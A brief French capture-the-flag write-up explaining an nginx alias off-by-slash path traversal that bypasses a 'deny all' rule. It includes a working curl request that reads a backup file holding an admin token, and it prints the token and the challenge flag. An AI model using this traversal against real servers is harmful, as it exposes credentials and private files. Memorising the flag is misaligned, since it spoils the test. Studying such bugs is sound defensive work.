# nginx-alias (off-by-slash)

- Catégorie : web
- Résolu : sam. 07 nov.

## Énoncé
Snapshot site nginx (nginx.conf + webroot/). Un dossier privé /config est censé être inaccessible mais un backup périmé y porte le token admin. Flag = NCTF{nginx_alias_offbyslash_<token>}.

## Faille
location /assets  (SANS slash) + alias /srv/kekeli/public/assets/ (AVEC slash).
=> GET /assets../config/settings.py.bak  ->  alias + '../config/settings.py.bak'
   = /srv/kekeli/public/config/settings.py.bak.
L'URI commence par /assets, donc le bloc "location /config { deny all; }" ne s'applique pas. Path traversal off-by-slash.

## Token
settings.py.bak : ADMIN_API_TOKEN = "a7f3c0de91".

## Exploitation (si instance)
curl --path-as-is http://kekeli.internal/assets../config/settings.py.bak

## Flag
`NCTF{nginx_alias_offbyslash_a7f3c0de91}`
